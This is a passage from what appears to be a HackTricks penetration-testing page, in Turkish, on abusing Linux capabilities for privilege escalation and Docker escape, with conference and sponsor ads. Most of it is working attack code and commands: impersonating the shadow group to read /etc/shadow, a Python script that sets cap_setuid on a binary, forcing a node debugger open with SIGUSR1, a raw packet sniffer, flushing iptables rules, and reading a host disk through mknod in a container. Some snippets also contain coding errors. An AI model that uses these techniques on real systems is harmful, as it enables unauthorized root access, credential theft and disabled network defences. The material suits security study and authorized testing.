Bu komut, belirtilen gruba ait izinleri geçici olarak almanızı sağlar. Bu sayede, o gruba ait dosyalara erişim sağlayabilir ve ayrıcalıkları yükseltebilirsiniz.
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Bu durumda shadow grubu taklit edildi, bu nedenle `/etc/shadow` dosyasını okuyabilirsiniz:
```bash
cat /etc/shadow
```
Eğer **docker** yüklü ise, **docker grubunu** taklit edebilir ve [**docker soketiyle iletişim kurarak** ayrıcalıkları yükseltebilirsiniz](./#writable-docker-socket).

## CAP\_SETFCAP

**Bu, dosyalara ve işlemlere yetenekler atanabilmesi anlamına gelir**

**Binary ile örnek**

Eğer python bu **yeteneğe** sahipse, ayrıcalıkları kök kullanıcıya yükseltmek için bunu çok kolay bir şekilde kötüye kullanabilirsiniz:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Not edin ki CAP\_SETFCAP ile yeni bir yetenek ayarlarsanız, bu yeteneği kaybedersiniz.
{% endhint %}

[SETUID yeteneğine](linux-capabilities.md#cap\_setuid) sahip olduktan sonra, ayrıcalıkları yükseltmek için nasıl yapılacağını görmek için bölümüne gidebilirsiniz.

**Ortam ile örnek (Docker kaçışı)**

Varsayılan olarak, **Docker içindeki sürece CAP\_SETFCAP yeteneği verilir**. Bunu kontrol etmek için şunu yapabilirsiniz:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Bu yetenek, ikili dosyalara herhangi bir başka yetenek vermemizi sağlar, bu yüzden bu sayfada bahsedilen diğer yetenek kaçışlarını kötüye kullanarak konteynerden kaçmak mümkün olabilir.\
Ancak, örneğin gdb ikili dosyasına CAP\_SYS\_ADMIN ve CAP\_SYS\_PTRACE yeteneklerini vermeye çalışırsanız, bunları verebileceğinizi fark edeceksiniz, ancak ikili dosya bundan sonra çalıştırılamaz olacaktır:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Belgelerden](https://man7.org/linux/man-pages/man7/capabilities.7.html): _İzin verilen: Bu, iş parçacığının üstlenebileceği etkin yetenekler için bir **sınırlayıcı üst küme**dir. Ayrıca, etkin kümesinde **CAP\_SETPCAP** yeteneğine sahip olmayan bir iş parçacığı tarafından devralınabilir kümesine eklenen yetenekler için de bir sınırlayıcı üst kümedir._\
Görünüşe göre, İzin Verilen yetenekler kullanılabilecek olanları sınırlar.\
Ancak, Docker da varsayılan olarak **CAP\_SETPCAP** yeteneğini verir, bu yüzden **devralınabilir yetenekler içinde yeni yetenekler ayarlayabilirsiniz**.\
Ancak, bu yetenek belgesinde şöyle denir: _CAP\_SETPCAP: \[…\] **çağrı yapan iş parçacığının sınırlayıcı** kümesinden devralınabilir kümesine herhangi bir yetenek ekleyin_.\
Görünüşe göre, devralınabilir kümesine CAP\_SYS\_ADMIN veya CAP\_SYS\_PTRACE gibi yeni yetenekler ekleyemeyiz, yalnızca sınırlayıcı kümesinden yetenek ekleyebiliriz, bu da **ayrıcalıkları yükseltmek için devralınabilir kümesine yeni yetenekler ekleyemeyeceğimiz** anlamına gelir.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `/dev/mem`, `/dev/kmem` veya `/proc/kcore`'e erişim, `mmap_min_addr`'ı değiştirme, `ioperm(2)` ve `iopl(2)` sistem çağrılarına erişim ve çeşitli disk komutları gibi bir dizi hassas işlemi sağlar. Bu yetenek aracılığıyla `FIBMAP ioctl(2)` de etkinleştirilir, bu da [geçmişte](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) sorunlara neden olmuştur. Kılavuz sayfasına göre, bu ayrıca sahibin diğer cihazlarda **açıklayıcı bir şekilde cihaz özgü işlemler gerçekleştirmesine** izin verir.

Bu, **ayrıcalık yükseltme** ve **Docker kaçışı** için kullanışlı olabilir.

## CAP\_KILL

**Bu, herhangi bir işlemi sonlandırmanın mümkün olduğu anlamına gelir.**

**Binary ile örnek**

Haydi **`python`** binary'sinin bu yeteneği olduğunu varsayalım. Eğer **ayrıca bazı servis veya soket yapılandırmasını** (veya bir servise ilişkin herhangi bir yapılandırma dosyasını) değiştirebilirseniz, ona bir arka kapı yerleştirebilir ve ardından o servisle ilişkili işlemi sonlandırabilir ve yeni yapılandırma dosyasının arka kapınızla yürütülmesini bekleyebilirsiniz.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill ile Privilege Escalation**

Eğer kill yeteneklerine sahipseniz ve **kök kullanıcı olarak çalışan bir node programı** (veya farklı bir kullanıcı olarak) varsa, muhtemelen ona **SIGNAL SIGUSR1** sinyali gönderebilir ve onu **node hata ayıklayıcısını açmaya** zorlayabilirsiniz. Böylece bağlantı kurabilirsiniz.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) İspanya'daki en ilgili siber güvenlik etkinliği ve Avrupa'daki en önemli etkinliklerden biridir. Teknik bilginin yayılmasını amaçlayan bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Bu, herhangi bir bağlantı noktasında (hatta ayrıcalıklı olanlarda bile) dinlemenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları yükseltemezsiniz.

**Örnek ikili ile**

Eğer **`python`** bu yeteneğe sahipse, herhangi bir bağlantı noktasında dinleyebilir ve hatta diğer bağlantı noktalarına bağlanabilir (bazı hizmetler belirli ayrıcalıklı bağlantı noktalarından bağlantı gerektirir)

{% tabs %}
{% tab title="Dinle" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Bağlan" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yeteneği, işlemlerin **RAW ve PACKET soketleri oluşturmasına** izin verir, böylece rastgele ağ paketleri oluşturup gönderebilirler. Bu, paket sahteciliği, trafik enjeksiyonu ve ağ erişim kontrollerini atlamak gibi güvenlik risklerine yol açabilir. Kötü niyetli aktörler, yeterli güvenlik duvarı koruması olmadan özellikle konteynerleştirilmiş ortamlarda konteyner yönlendirmesine müdahale etmek veya ana bilgisayar ağ güvenliğini tehlikeye atmak için bunu istismar edebilir. Ayrıca, **CAP_NET_RAW**, RAW ICMP istekleri aracılığıyla ping gibi işlemleri desteklemek için ayrıcalıklı konteynerler için önemlidir.

**Bu, trafiği dinlemenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları yükseltemezsiniz.

**Örnek binary ile**

Eğer **`tcpdump`** binary'si bu yeteneğe sahipse, ağ bilgilerini yakalamak için onu kullanabilirsiniz.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Not: Eğer **çevre** bu yeteneği sağlıyorsa, trafiği izlemek için **`tcpdump`** kullanabilirsiniz.

**2. Örnek ile ikili**

Aşağıdaki örnek, "**lo**" (**localhost**) arayüzünün trafiğini yakalamak için kullanışlı olabilecek **`python2`** kodudur. Kod, [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) adresindeki "_The Basics: CAP-NET\_BIND + NET\_RAW_" adlı laboratuvardan alınmıştır.
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, sahibine ağ yapılandırmalarını değiştirme gücü verir. Bu, güvenlik duvarı ayarları, yönlendirme tabloları, soket izinleri ve açık ağ ad alanları içindeki ağ arayüzü ayarlarını değiştirmeyi içerir. Ayrıca, ad alanları arasında paket dinlemeye olanak tanıyan **promiscuous mode**'u etkinleştirme imkanı sağlar.

**Örnek ikili dosya ile**

Varsayalım ki **python ikili dosyası** bu yetkilere sahip.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Bu, inode özniteliklerini değiştirmenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları yükseltemezsiniz.

**Binary ile örnek**

Eğer bir dosyanın değiştirilemez olduğunu ve python'ın bu yeteneğe sahip olduğunu bulursanız, **değiştirilemez özniteliği kaldırabilir ve dosyayı değiştirilebilir hale getirebilirsiniz:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Genellikle bu değişmez öznitelik ayarlanır ve kaldırılırken kullanılır:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `chroot(2)` sistem çağrısının yürütülmesine izin verir ve bu da bilinen güvenlik açıklarından dolayı `chroot(2)` ortamlarından kaçmayı mümkün kılar:

* [Çeşitli chroot çözümlerinden nasıl kaçılır](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot kaçış aracı](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), sistem yeniden başlatmaları için `reboot(2)` sistem çağrısının yanı sıra, belirli donanım platformları için özelleştirilmiş `LINUX_REBOOT_CMD_RESTART2` gibi belirli komutları da içeren `reboot(2)` sistem çağrısının yürütülmesine izin verir. Ayrıca, Linux 3.17'den itibaren yeni veya imzalı çökme çekirdeklerini yüklemek için `kexec_load(2)` ve `kexec_file_load(2)` kullanımını da etkinleştirir.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html), Linux 2.6.37'de daha geniş kapsamlı **CAP_SYS_ADMIN**'den ayrılmış olup özellikle `syslog(2)` çağrısının kullanımına izin verir. Bu yetenek, `kptr_restrict` ayarının 1 olduğu durumlarda `/proc` ve benzeri arayüzler aracılığıyla çekirdek adreslerinin görüntülenmesini sağlar. `kptr_restrict`, çekirdek adreslerinin açığa çıkmasını kontrol eden bir ayar olup Linux 2.6.39'dan itibaren varsayılan olarak 0'dır, yani çekirdek adresleri açıktır. Bununla birlikte, birçok dağıtım bu ayarı güvenlik nedenleriyle 1 (adresleri yalnızca uid 0'dan gizle) veya 2 (her zaman adresleri gizle) olarak ayarlar.

Ek olarak, **CAP_SYSLOG**, `dmesg_restrict` 1 olarak ayarlandığında `dmesg` çıktısına erişimi sağlar. Bu değişikliklere rağmen, **CAP_SYS_ADMIN**, tarihsel öncelikler nedeniyle `syslog` işlemlerini gerçekleştirme yeteneğini korur.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` sistem çağrısının işlevselliğini, düzenli dosyalar, FIFO'lar (isimlendirilmiş borular) veya UNIX etki alanı soketleri oluşturmanın ötesine genişletir. Özellikle, özel dosyaların oluşturulmasına izin verir, bunlar şunları içerir:

- **S_IFCHR**: Terminal gibi cihazlar olan karakter özel dosyaları.
- **S_IFBLK**: Disk gibi cihazlar olan blok özel dosyaları.

Bu yetenek, karakter veya blok cihazları aracılığıyla doğrudan donanım etkileşimi sağlayan işlemler için gereklidir.

Bu, bir Docker yeteneği ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)) olarak varsayılan olarak ayarlanmıştır.

Bu yetenek, aşağıdaki koşullar altında ana bilgisayarda ayrıcalık yükseltmeleri yapılmasına izin verir (tam disk okuması yoluyla):

1. Ana bilgisayara başlangıç erişimi olmalıdır (Ayrıcalıksız).
2. Konteynere başlangıç erişimi olmalıdır (Ayrıcalıklı (EUID 0) ve etkin `CAP_MKNOD`).
3. Ana bilgisayar ve konteyner aynı kullanıcı ad alanını paylaşmalıdır.

**Bir Konteynerde Blok Cihazı Oluşturma ve Erişme Adımları:**

1. **Standart Bir Kullanıcı Olarak Ana Bilgisayarda:**
- Mevcut kullanıcı kimliğinizi `id` komutuyla belirleyin, örneğin `uid=1000(standarduser)`.
- Hedef cihazı belirleyin, örneğin `/dev/sdb`.

2. **`root` Olarak Konteyner İçinde:**
```markdown
```
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Ana Bilgisayarda Geri Dönün:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Bu yaklaşım, paylaşılan kullanıcı ad alanları ve cihaz üzerinde ayarlanan izinler aracılığıyla standart kullanıcının `/dev/sdb` üzerinden konteyner aracılığıyla verilere erişmesine ve potansiyel olarak okumasına olanak tanır.


### CAP\_SETPCAP

**CAP_SETPCAP**, bir işlemin başka bir işlemin yetenek kümesini **değiştirmesine** olanak tanır ve etkin, miras alınabilir ve izin verilen kümelere yetenek eklemesine veya kaldırmasına olanak tanır. Ancak, bir işlem yalnızca kendi izin verilen kümesinde sahip olduğu yetenekleri değiştirebilir, böylece başka bir işlemin ayrıcalıklarını kendi ayrıcalık düzeyinin ötesine yükseltemez. Son kernel güncellemeleri, `CAP_SETPCAP`'i yalnızca kendi veya alt işlemlerinin izin verilen kümesindeki yetenekleri azaltmak için sınırlayan bu kuralları sıkılaştırmıştır. Kullanım, etkin kümede `CAP_SETPCAP`'e ve hedef yeteneklere sahip olmayı gerektirir ve değişiklikler için `capset()` kullanır. Bu, `CAP_SETPCAP`'in temel işlevini ve sınırlamalarını özetler ve ayrıcalık yönetimi ve güvenlik geliştirmedeki rolünü vurgular.

**`CAP_SETPCAP`**, bir işlemin başka bir işlemin yetenek kümesini **değiştirmesine** olanak tanıyan bir Linux yeteneğidir. Diğer işlemlerin etkin, miras alınabilir ve izin verilen yetenek kümesine yetenek eklemesine veya kaldırmasına izin verir. Ancak, bu yeteneğin kullanımına yönelik belirli kısıtlamalar vardır.

`CAP_SETPCAP`'e sahip bir işlem, **yalnızca kendi izin verilen yetenek kümesinde bulunan yetenekleri** verebilir veya kaldırabilir. Başka bir işleme bir yetenek veremezse, bu yeteneğe sahip değilse. Bu kısıtlama, bir işlemin başka bir işlemin ayrıcalıklarını kendi ayrıcalık düzeyinin ötesine yükseltmesini engeller.

Ayrıca, son kernel sürümlerinde `CAP_SETPCAP` yeteneği **daha da sınırlanmıştır**. Artık bir işlemi keyfi olarak diğer işlemlerin yetenek kümesini değiştirmeye izin vermez. Bunun yerine, yalnızca bir işlemin kendi izin verilen yetenek kümesinde veya alt işlemlerinin izin verilen yetenek kümesindeki yetenekleri azaltmasına izin verir. Bu değişiklik, yetenekle ilişkili potansiyel güvenlik risklerini azaltmak için yapılmıştır.

`CAP_SETPCAP`'i etkili bir şekilde kullanmak için, etkin yetenek kümenizde yeteneğe sahip olmanız ve hedef yetenekleri izin verilen yetenek kümenizde bulunmanız gerekir. Ardından, diğer işlemlerin yetenek kümesini değiştirmek için `capset()` sistem çağrısını kullanabilirsiniz.

Özetlemek gerekirse, `CAP_SETPCAP`, bir işlemin diğer işlemlerin yetenek kümesini değiştirmesine olanak tanır, ancak kendisinde olmayan yetenekleri veremez. Ayrıca, güvenlik endişeleri nedeniyle, son kernel sürümlerinde işlevselliği yalnızca kendi izin verilen yetenek kümesindeki yetenekleri azaltmaya veya alt işlemlerinin izin verilen yetenek kümesindeki yetenekleri azaltmaya izin vermek için sınırlanmıştır.

## Referanslar

**Bu örneklerin çoğu,** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **adlı bir laboratuvardan alınmıştır, bu nedenle bu ayrıcalık yükseltme tekniklerini uygulamak isterseniz bu laboratuvarları öneririm.**

**Diğer referanslar**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/), **İspanya**'daki en önemli siber güvenlik etkinliği ve **Avrupa**'nın en önemli etkinliklerinden biridir. Teknik bilginin yayılmasını amaçlayan bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek katkıda bulunun.

</details>
